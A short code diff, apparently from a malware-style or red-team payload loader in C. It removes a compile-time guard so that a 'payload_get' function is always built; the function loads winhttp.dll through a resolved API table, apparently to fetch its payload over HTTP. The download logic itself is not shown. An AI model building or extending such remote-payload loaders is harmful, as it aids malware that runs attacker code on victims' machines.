@@ -5,7 +5,7 @@
 
 
 
-#ifdef PAYLOAD_REMOTE_HTTP
+
 LPVOID payload_get(PDWORD PayloadSize) {
 
     HMODULE winhttp = g_ldr->apis->LoadLibraryA("winhttp.dll");
@@ -100,4 +100,3 @@ CLEANUP:
 
     return outBuffer;
 }
-#endif
